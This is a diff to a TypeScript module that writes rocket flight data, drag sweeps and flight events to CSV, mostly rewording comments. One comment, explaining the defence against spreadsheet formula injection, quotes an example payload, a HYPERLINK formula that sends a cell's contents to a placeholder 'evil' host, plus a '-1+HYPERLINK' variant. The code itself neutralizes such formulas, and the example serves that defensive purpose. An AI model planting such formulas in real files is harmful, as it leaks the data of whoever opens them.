@@ -15,7 +15,7 @@ import { neutralizeFormula } from './csvCell';
 /**
  * CSV exporters for the flight time-series and the drag sweep. Columns are
  * written in the user's chosen units, and every header cell names the unit it
- * carries — so a file stays self-describing whatever the preference was when it
+ * carries, so a file stays self-describing whatever the preference was when it
  * was written. Numbers use '.' as the decimal separator regardless of locale.
  *
  * `siToUiDelta`, not `siToUi`: a whole column is being scaled, and none of these
@@ -39,7 +39,7 @@ const col = (units: UnitSelection, q: Quantity): { f: number; sym: string } => (
 
 /**
  * How a flight CSV is written: which columns, in what format, with which
- * comments — OpenRocket's own Export data options, which it keeps in
+ * comments: OpenRocket's own Export data options, which it keeps in
  * `CsvOptionPanel` and the export panel beside it.
  *
  * All of it is the user's choice: a fixed twelve columns, comma separated, six
@@ -109,7 +109,7 @@ export function flightDataCsv(
   // A separator inside a field would split the row; the comment character
   // leading a data line would comment it out. Neither can happen with the
   // separators and characters the dialog offers, and a header is the only text
-  // in the file, so quoting stays out of it - but the header still gets stripped
+  // in the file, so quoting stays out of it; the header still gets stripped
   // rather than trusted.
   const clean = (text: string) =>
     text
@@ -172,8 +172,8 @@ export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
   if (d.hasNozzle) header.push('Cd_powerOn');
   header.push(`CP (${len.sym})`, 'CNalpha (/rad)');
   // Components are identified by a stable key, not by name, so two unnamed body
-  // tubes now arrive as two distinct columns rather than one merged one. Number
-  // the repeats so the header still says which column is which.
+  // tubes arrive as two distinct columns rather than one merged one. Number the
+  // repeats so the header still says which column is which.
   const seen = new Map<string, number>();
   for (const c of d.components) {
     const base = compHeader(c.name);
@@ -201,13 +201,13 @@ export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
 }
 
 /**
- * The flight's EVENTS, one row each, with the state of the rocket at that
- * instant — the timeline the Results tab shows, as a file.
+ * The flight's events, one row each, with the state of the rocket at that
+ * instant: the timeline the Results tab shows, as a file.
  *
  * Every extra gets a column of its own here, where the table on screen puts
  * them on a sub-line: a table has 380px and a file has none, and a spreadsheet
  * wants a rectangle it can sort and chart rather than prose in a cell. Most
- * rows leave most of those columns blank, which is the honest shape - only the
+ * rows leave most of those columns blank, which is the honest shape: only the
  * rail-departure row has a thrust-to-weight, and a blank cell says so.
  *
  * `eventName` and `stageName` are passed in for the reason `columnName` is
@@ -216,7 +216,7 @@ export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
  * is the same split `buildTraces` and the table itself make.
  *
  * Separate from {@link flightDataCsv}, which writes the per-timestep series and
- * can already carry the events as COMMENT lines. A comment is for a reader; the
+ * can already carry the events as comment lines. A comment is for a reader; the
  * question this answers is "give me the events as data".
  */
 export function flightEventsCsv(
@@ -233,14 +233,14 @@ export function flightEventsCsv(
   // Names come from the design and from a translation, so they can hold a comma
   // or a newline; neither may split the row. Quoting rather than stripping,
   // because unlike a column header these are the user's own words.
-  // Quoting alone does NOT stop spreadsheet formula injection: Excel and Sheets
+  // Quoting alone does not stop spreadsheet formula injection: Excel and Sheets
   // strip the quoting before evaluating, so a recovery device named
-  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork executes when the
-  // exported events CSV is opened. Prefix a `'` on a leading trigger, as
-  // reportCsv's `cell` does.
+  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork would execute when
+  // the exported events CSV is opened. `neutralizeFormula` prefixes a `'` on a
+  // leading trigger, as reportCsv's `cell` does.
   //
   // Strict on a leading `-`, unlike flightPathExport's escaper: every value
-  // here is a NAME, so there is no negative number to keep numeric, and
+  // here is a name, so there is no negative number to keep numeric, and
   // `-1+HYPERLINK(...)` does evaluate.
   const text = (v: string | undefined): string => {
     if (v == null || v === '') return '';
